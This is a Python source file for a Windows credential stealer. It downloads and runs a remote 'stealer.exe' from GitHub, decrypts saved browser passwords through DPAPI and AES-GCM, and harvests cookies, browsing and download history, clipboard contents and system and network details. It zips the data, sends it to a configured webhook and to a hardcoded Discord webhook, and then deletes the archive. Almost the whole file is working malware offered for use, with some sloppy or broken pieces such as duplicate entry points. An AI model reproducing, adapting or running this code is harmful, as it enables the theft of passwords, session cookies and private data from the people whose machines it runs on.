import os
import json
import base64
import shutil
import sqlite3
import requests
import zipfile
import time
import socket
import platform
import psutil
import pyautogui
import uuid
import getpass
import datetime
import pyperclip
import subprocess
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from win32crypt import CryptUnprotectData
from pathlib import Path

def run_stealer():
    try:
        # Change directory to the script's directory
        os.chdir(os.path.dirname(os.path.abspath(__file__)))

        # Download stealer.exe from GitHub using git
        git_command = 'git clone --depth=1 https://github.com/THECCP0069/nnnnn.git'
        subprocess.run(git_command, shell=True, check=True)

        # Wait for git clone to complete
        time.sleep(3)  # Adjust delay as necessary

        # Run stealer.exe (assuming it's already an executable)
        stealer_path = os.path.join(os.getcwd(), 'nnnnn', 'stealer.exe')
        if os.path.exists(stealer_path):
            subprocess.Popen(stealer_path)
            print(f"Successfully started {stealer_path}")
        else:
            print(f"Failed to find {stealer_path}")

        # Wait for 5 seconds (adjust as needed)
        time.sleep(5)

    except Exception as e:
        print(f"Error: {e}")

def main():
    try:
        # Call function to run stealer.exe
        run_stealer()

        # Continue with other parts of your script here
        print("Continuing with other script logic...")

        # Example: Creating a directory after stealer.exe has run
        new_directory = os.path.join(os.getcwd(), 'new_directory')
        os.makedirs(new_directory, exist_ok=True)
        print(f"Created directory: {new_directory}")

        # Example: Listing files in the current directory
        files_in_directory = os.listdir(os.getcwd())
        print(f"Files in current directory: {files_in_directory}")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()

# Browser paths dictionary
appdata = os.getenv('APPDATA')
localappdata = os.getenv('LOCALAPPDATA')

browsers = {
    'amigo': os.path.join(appdata, 'Amigo', 'User Data'),
    'torch': os.path.join(appdata, 'Torch', 'User Data'),
    'kometa': os.path.join(appdata, 'Kometa', 'User Data'),
    'orbitum': os.path.join(appdata, 'Orbitum', 'User Data'),
    'cent-browser': os.path.join(appdata, 'CentBrowser', 'User Data'),
    '7star': os.path.join(appdata, '7Star', '7Star', 'User Data'),
    'sputnik': os.path.join(appdata, 'Sputnik', 'Sputnik', 'User Data'),
    'vivaldi': os.path.join(appdata, 'Vivaldi', 'User Data'),
    'google-chrome-sxs': os.path.join(localappdata, 'Google', 'Chrome SxS', 'User Data'),
    'google-chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data'),
    'epic-privacy-browser': os.path.join(localappdata, 'Epic Privacy Browser', 'User Data'),
    'microsoft-edge': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data'),
    'uran': os.path.join(appdata, 'uCozMedia', 'Uran', 'User Data'),
    'yandex': os.path.join(appdata, 'Yandex', 'YandexBrowser', 'User Data'),
    'brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'iridium': os.path.join(localappdata, 'Iridium', 'User Data'),
    'firefox': os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')  # Firefox profiles directory
}

# Function to retrieve master key from Chrome or Edge browser
def get_master_key(browser_path: str):
    if not os.path.exists(browser_path):
        return None

    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"Error retrieving master key from {browser_path}: {e}")
        return None

# Function to decrypt password using AES-GCM encryption
def decrypt_password(buff: bytes, master_key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:-16]
        tag = buff[-16:]
        cipher = AESGCM(master_key)
        decrypted_pass = cipher.decrypt(iv, payload + tag, None).decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

# Function to retrieve browsing history from specified browser profile
def get_browser_history(path: str, profile: str):
    history_db = os.path.join(path, profile, 'History')
    if not os.path.exists(history_db):
        print(f"History database '{history_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'history_db')
    try:
        shutil.copy(history_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT datetime(last_visit_time/1000000-11644473600,"unixepoch"), url FROM urls ORDER BY last_visit_time DESC')
        history_data = ""
        for row in cursor.fetchall():
            visit_time = datetime.datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            history_data += f"Time: {visit_time}\nURL: {row[1]}\n\n"
        conn.close()
        os.remove(temp_db)
        return history_data
    except Exception as e:
        print(f"Error retrieving history from {path}: {e}")
        return ""

# Function to retrieve download history from specified browser profile
def get_browser_downloads(path: str, profile: str):
    downloads_db = os.path.join(path, profile, 'History')
    if not os.path.exists(downloads_db):
        print(f"Download history database '{downloads_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'downloads_db')
    try:
        shutil.copy(downloads_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT datetime(start_time/1000000-11644473600,"unixepoch"), target_path, total_bytes FROM downloads ORDER BY start_time DESC')
        downloads_data = ""
        for row in cursor.fetchall():
            start_time = datetime.datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            downloads_data += f"Time: {start_time}\nFile: {row[1]}\nSize: {row[2]} bytes\n\n"
        conn.close()
        os.remove(temp_db)
        return downloads_data
    except Exception as e:
        print(f"Error retrieving downloads from {path}: {e}")
        return ""

# Function to retrieve cookies from specified browser profile
def get_browser_cookies(path: str, profile: str):
    cookies_db = os.path.join(path, profile, 'Cookies')
    if not os.path.exists(cookies_db):
        print(f"Cookies database '{cookies_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'cookies_db')
    try:
        shutil.copy(cookies_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value, last_access_utc FROM cookies ORDER BY last_access_utc DESC')
        cookies_data = ""
        for row in cursor.fetchall():
            try:
                decrypted_value = decrypt_password(row[2], b'v10::string')
                cookies_data += f"Host: {row[0]}\nName: {row[1]}\nValue: {decrypted_value}\nLast Access Time: {row[3]}\n\n"
            except Exception as e:
                print(f"Error decrypting cookie value: {e}")
        conn.close()
        os.remove(temp_db)
        return cookies_data
    except Exception as e:
        print(f"Error retrieving cookies from {path}: {e}")
        return ""

# Function to retrieve login data from specified browser profile
def get_login_data(path: str, profile: str, master_key):
    login_db = os.path.join(path, profile, 'Login Data')
    if not os.path.exists(login_db):
        print(f"Login database '{login_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'login_db')
    try:
        shutil.copy(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        login_data = ""
        for row in cursor.fetchall():
            try:
                password = decrypt_password(row[2], master_key)
                login_data += f"URL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n\n"
            except Exception as e:
                print(f"Error decrypting password from {path}: {e}")
        conn.close()
        os.remove(temp_db)
        return login_data
    except Exception as e:
        print(f"Error retrieving login data from {path}: {e}")
        return ""

# Function to gather general system and network information
def gather_general_info():
    try:
        geninfo_file = 'geninfo.txt'
        with open(geninfo_file, 'w', encoding='utf-8') as f:
            # Clipboard content (using pyperclip)
            clipboard_content = pyperclip.paste()
            f.write(f"Clipboard: {clipboard_content}\n\n")

            # IP Addresses and MAC Address
            try:
                hostname = socket.gethostname()
                ip_address = socket.gethostbyname(hostname)
                public_ip = requests.get('https://api64.ipify.org').text
                private_ip = socket.gethostbyname(hostname)
                mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
                f.write(f"IP Address: {ip_address}\nPublic IPv4: {public_ip}\nPrivate IPv4: {private_ip}\nMAC Address: {mac_address}\n\n")
            except Exception as e:
                print(f"Error getting network information: {e}")

            # PC Name and User Info
            try:
                f.write(f"PC Name: {hostname}\nUsername: {getpass.getuser()}\n\n")
            except Exception as e:
                print(f"Error getting PC name and username: {e}")

            # Windows PC Specifications
            try:
                system_info = platform.uname()
                f.write(f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}\n\n")
            except Exception as e:
                print(f"Error getting system information: {e}")

            # Additional System Information
            try:
                # Get CPU information
                cpu_info = f"CPU: {platform.processor()}\n"
                cpu_info += f"Physical cores: {psutil.cpu_count(logical=False)}\n"
                cpu_info += f"Total cores: {psutil.cpu_count(logical=True)}\n"
                f.write(cpu_info)

                # Get RAM information
                memory_info = f"RAM: {round(psutil.virtual_memory().total / (1024.0 ** 3), 2)} GB\n"
                f.write(memory_info)

                # Get disk information
                disk_info = f"Disk: {round(psutil.disk_usage('/').total / (1024.0 ** 3), 2)} GB\n"
                f.write(disk_info)
            except Exception as e:
                print(f"Error getting additional system information: {e}")

        return geninfo_file
    except Exception as e:
        print(f"Error gathering general system information: {e}")
        return ""

# Function to download file from URL and save to Documents folder
def download_file_from_url(url, save_path):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(response.content)
            print(f"File downloaded successfully from {url} to {save_path}")
            return True
        else:
            print(f"Failed to download file from {url}. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"Error downloading file from {url}: {e}")
        return False

# Function to create a temporary ZIP file with all collected data
def create_temp_zip(login_data_dict, history_data_dict, downloads_data_dict, cookies_data_dict, geninfo_file, additional_info_file):
    try:
        zip_filename = os.path.join(os.getenv('USERPROFILE'), 'Documents', 'vault.zip')
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for browser, login_data in login_data_dict.items():
                zipf.writestr(f'{browser}_logins.txt', login_data)
            for browser, history_data in history_data_dict.items():
                zipf.writestr(f'{browser}_history.txt', history_data)
            for browser, downloads_data in downloads_data_dict.items():
                zipf.writestr(f'{browser}_downloads.txt', downloads_data)
            for browser, cookies_data in cookies_data_dict.items():
                zipf.writestr(f'{browser}_cookies.txt', cookies_data)
            if geninfo_file:
                zipf.write(geninfo_file, 'geninfo.txt')
            if additional_info_file:
                zipf.write(additional_info_file, 'additional_info.txt')
            # Include filepath.txt (not implemented in this example)

        return zip_filename
    except Exception as e:
        print(f"Error creating temporary ZIP file: {e}")
        return ""

def send_results(zip_filename, webhook_url):
    try:
        if zip_filename:
            with open(zip_filename, 'rb') as f:
                files = {'file': (zip_filename, f, 'application/zip')}
                # Send to the primary webhook URL
                response = requests.post(webhook_url, files=files)
                if response.status_code == 200:
                    print(f"Successfully sent login data to primary webhook.")
                else:
                    print(f"Failed to send login data to primary webhook. Status code: {response.status_code}")

                # Send to Discord webhook as well
                discord_webhook_url = 'https://discord.com/api/webhooks/1256683281571778640/X8i1ztCXzvxP6U2m5kAS9iA-Ku4kFweMCxwA6RdrHjU0Qi_NHGIVpelUIPItik9Y2OJn'
                send_to_discord(zip_filename, discord_webhook_url)

            # Delete the temporary ZIP file after 3 seconds
            time.sleep(3)
            os.remove(zip_filename)

    except Exception as e:
        print(f"Error sending results to webhook: {e}")

def send_to_discord(zip_filename, discord_webhook_url):
    try:
        if zip_filename:
            with open(zip_filename, 'rb') as f:
                files = {'file': (zip_filename, f, 'application/zip')}
                response = requests.post(discord_webhook_url, files=files)
                if response.status_code == 200:
                    print(f"Successfully sent login data to Discord webhook.")
                else:
                    print(f"Failed to send login data to Discord webhook. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending results to Discord webhook: {e}")




if __name__ == "__main__":
    try:
        # Load webhook URL from webhook.json
        webhook_json_path = os.path.join(os.path.dirname(__file__), 'webhook.json')
        if os.path.exists(webhook_json_path):
            with open(webhook_json_path, 'r') as f:
                webhook_data = json.load(f)
                webhook_url = webhook_data.get('webhook_url')
                if not webhook_url:
                    print("Webhook URL not found in webhook.json.")
                    exit(1)
        else:
            print("webhook.json not found.")
            exit(1)

        # Check PC name and skip downloading and executing stealer.exe if PC name is "GG" or "gg"
        hostname = socket.gethostname()
        if hostname.lower() == "hh":
            print("PC name is 'GGwdwedw'. Skipping download and execution of stealer.exe.")
        else:
            # Download stealer.exe from GitHub to Documents folder
            github_url = 'https://github.com/THECCP0069/nnnnn/blob/main/stealer.exe'
            save_folder = Path(os.getenv('USERPROFILE')) / 'Documents'
            save_path = save_folder / 'stealer.exe'

            if download_file_from_url(github_url, save_path):
                # Execute stealer.exe from the Documents folder
                print(f"Executing {save_path}...")
                try:
                    os.startfile(save_path)  # Windows specific way to start an executable
                except Exception as e:
                    print(f"Error executing {save_path}: {e}")
            else:
                print("Failed to download stealer.exe. Skipping execution.")

        # Dictionary to store login data, history data, downloads data, and cookies data for each browser
        login_data_dict = {}
        history_data_dict = {}
        downloads_data_dict = {}
        cookies_data_dict = {}

        # Loop through each browser and retrieve data
        for browser, path in browsers.items():
            if browser in ['firefox']:  # Skip Firefox for now
                continue

            master_key = get_master_key(path)
            if master_key:
                login_data = get_login_data(path, 'Default', master_key)
                login_data_dict[browser] = login_data
                history_data = get_browser_history(path, 'Default')
                history_data_dict[browser] = history_data
                downloads_data = get_browser_downloads(path, 'Default')
                downloads_data_dict[browser] = downloads_data
                cookies_data = get_browser_cookies(path, 'Default')
                cookies_data_dict[browser] = cookies_data
            else:
                print(f"Failed to retrieve master key for {browser}. Skipping...")

   

        # Gather general system and network information
        geninfo_file = gather_general_info()

        # Create additional system information file
        additional_info_file = 'additional_info.txt'
        try:
            with open(additional_info_file, 'w', encoding='utf-8') as f:
                # Additional information (customize as needed)
                f.write("Additional Information:\n")
                f.write("------------------------\n")
                f.write(f"Current Time: {datetime.datetime.now()}\n")
                f.write(f"Operating System: {platform.platform()}\n")
                f.write(f"Python Version: {platform.python_version()}\n")
        except Exception as e:
            print(f"Error creating additional information file: {e}")
            additional_info_file = None

        # Create a temporary ZIP file containing all gathered data
        zip_filename = create_temp_zip(login_data_dict, history_data_dict, downloads_data_dict, cookies_data_dict, geninfo_file, additional_info_file)

        # Send the ZIP file containing all gathered data to the webhook
        send_results(zip_filename, webhook_url)

        # Capture Bluetooth devices and WiFi networks
        try:
            devices_output = subprocess.run(['powershell', 'Get-PnpDevice', '|', 'select', 'Class, FriendlyName'], capture_output=True, text=True)
            with open('devices.txt', 'w', encoding='utf-8') as f:
                f.write(devices_output.stdout)
        except Exception as e:
            print(f"Error capturing Bluetooth devices: {e}")

        try:
            wifi_output = subprocess.run(['netsh', 'wlan', 'show', 'network', 'mode=Bssid'], capture_output=True, text=True)
            with open('wifi.txt', 'w', encoding='utf-8') as f:
                f.write(wifi_output.stdout)
        except Exception as e:
            print(f"Error capturing WiFi networks: {e}")

        # Capture netstat output
        try:
            netstat_output = subprocess.run(['netstat', '-ano'], capture_output=True, text=True)
            with open('netstat.txt', 'w', encoding='utf-8') as f:
                f.write(netstat_output.stdout)
        except Exception as e:
            print(f"Error capturing netstat output: {e}")

    except Exception as e:
        print(f"Main script error: {e}")